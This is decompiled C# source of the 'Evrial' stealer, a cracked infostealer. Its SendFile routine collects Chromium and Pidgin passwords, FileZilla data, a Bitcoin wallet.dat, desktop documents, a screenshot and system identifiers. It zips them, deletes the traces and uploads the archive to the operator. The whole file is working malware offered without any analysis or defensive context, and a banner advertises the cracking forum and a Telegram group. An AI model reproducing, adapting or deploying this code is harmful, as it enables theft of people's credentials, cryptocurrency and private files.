using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Text;
using System.Windows.Forms;
using Evrial.Cookies;

namespace Evrial.Stealer
{
	// Token: 0x02000014 RID: 20
	internal static class Passwords
	{
		// Token: 0x06000031 RID: 49 RVA: 0x00002DA8 File Offset: 0x00000FA8
		public static void SendFile()
		{
			string randomString = Helper.GetRandomString();
			string text = Path.GetTempPath() + randomString;
			Directory.CreateDirectory(text);
			using (StreamWriter streamWriter = new StreamWriter(text + "\\passwords.log"))
			{
				streamWriter.WriteLine(string.Concat(new string[]
				{
					"[————————————————————————————————————————————————————————]\r\n[==================== Project Evrial ====================]\r\n[========================================================]\r\n[=================== Crack XakFor.Net ===================]\r\n[========================================================]\r\n[======================= Telegram: ======================]\r\n[===== https://t.me/joinchat/Dk-XFgiWpYO-5nPzsNeCoQ =====]\r\n[————————————————————————————————————————————————————————]\r\n",
					string.Format("Date: {0}\r\n", DateTime.Now),
					string.Format("Windows Username: {0}\r\n", Environment.UserName),
					string.Format("HWID: {0}\r\n", RawSettings.HWID),
					string.Format("System: {0}\r\n", Passwords.GetWindowsVersion())
				}));
				try
				{
					foreach (PassData value in Chromium.Initialise())
					{
						streamWriter.WriteLine(value);
					}
				}
				catch
				{
				}
				try
				{
					foreach (PassData value2 in Messenger.Pidgin.Initialise())
					{
						streamWriter.WriteLine(value2);
					}
				}
				catch
				{
				}
			}
			try
			{
				Passwords.DesktopCopy(text);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
			try
			{
				Passwords.GetJpegScreen(text + "\\desktop.jpg");
			}
			catch (Exception ex2)
			{
				Console.WriteLine(ex2.ToString());
			}
			try
			{
				Chromium.ChromiumInitialise(text + "\\");
			}
			catch (Exception ex3)
			{
				Console.WriteLine(ex3.ToString());
			}
			try
			{
				FilezillaFTP.FileZilla.Initialise(text + "\\");
			}
			catch (Exception ex4)
			{
				Console.WriteLine(ex4.ToString());
			}
			try
			{
				string text2 = Wallet.BitcoinStealer();
				if (text2 != "" && File.Exists(text2))
				{
					File.Copy(text2, text + "\\wallet.dat");
				}
			}
			catch (Exception ex5)
			{
				Console.WriteLine(ex5.ToString());
			}
			try
			{
				Passwords.Zip(text, Path.GetTempPath() + "\\" + randomString + ".zip");
			}
			catch (Exception ex6)
			{
				Console.WriteLine(ex6.ToString());
			}
			try
			{
				Passwords.RemoveTempFiles(text);
			}
			catch (Exception ex7)
			{
				Console.WriteLine(ex7.ToString());
			}
			try
			{
				Network.UploadFile(Path.GetTempPath() + "\\" + randomString + ".zip");
			}
			catch (Exception ex8)
			{
				Console.WriteLine(ex8.ToString());
			}
		}

		// Token: 0x06000032 RID: 50 RVA: 0x0000309C File Offset: 0x0000129C
		private static void Zip(string path, string s)
		{
			ZipFile.CreateFromDirectory(path, s, CompressionLevel.Fastest, false, Encoding.UTF8);
		}

		// Token: 0x06000033 RID: 51 RVA: 0x000030AC File Offset: 0x000012AC
		public static string GetWindowsVersion()
		{
			string result;
			try
			{
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM CIM_OperatingSystem");
				string text = string.Empty;
				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					text = managementObject["Caption"].ToString();
				}
				if (text.Contains("8"))
				{
					result = "Windows 8";
				}
				else if (text.Contains("8.1"))
				{
					result = "Windows 8.1";
				}
				else if (text.Contains("10"))
				{
					result = "Windows 10";
				}
				else if (text.Contains("XP"))
				{
					result = "Windows XP";
				}
				else if (text.Contains("7"))
				{
					result = "Windows 7";
				}
				else if (text.Contains("Server"))
				{
					result = "Windows Server";
				}
				else
				{
					result = "Unknown";
				}
			}
			catch
			{
				result = "Unknown";
			}
			return result;
		}

		// Token: 0x06000034 RID: 52 RVA: 0x000031C8 File Offset: 0x000013C8
		private static void DesktopCopy(string directorypath)
		{
			try
			{
				foreach (FileInfo fileInfo in new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)).GetFiles())
				{
					if (!(fileInfo.Extension != ".txt") || !(fileInfo.Extension != ".doc") || !(fileInfo.Extension != ".docx") || !(fileInfo.Extension != ".log"))
					{
						Directory.CreateDirectory(directorypath + "\\Files\\");
						fileInfo.CopyTo(directorypath + "\\Files\\" + fileInfo.Name);
					}
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}

		// Token: 0x06000035 RID: 53 RVA: 0x0000328C File Offset: 0x0000148C
		private static void RemoveTempFiles(string directorypath)
		{
			try
			{
				foreach (DirectoryInfo directoryInfo in new DirectoryInfo(directorypath).GetDirectories())
				{
					foreach (FileInfo fileInfo in directoryInfo.GetFiles())
					{
						fileInfo.Delete();
					}
					directoryInfo.Delete();
				}
				foreach (FileInfo fileInfo2 in new DirectoryInfo(directorypath).GetFiles())
				{
					fileInfo2.Delete();
				}
				Directory.Delete(directorypath);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}

		// Token: 0x06000036 RID: 54 RVA: 0x0000333C File Offset: 0x0000153C
		private static void GetJpegScreen(string filepath)
		{
			try
			{
				Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
				Graphics graphics = Graphics.FromImage(bitmap);
				graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
				bitmap.Save(filepath, ImageFormat.Jpeg);
			}
			catch (Exception ex)
			{
				Console.WriteLine(ex.ToString());
			}
		}
	}
}
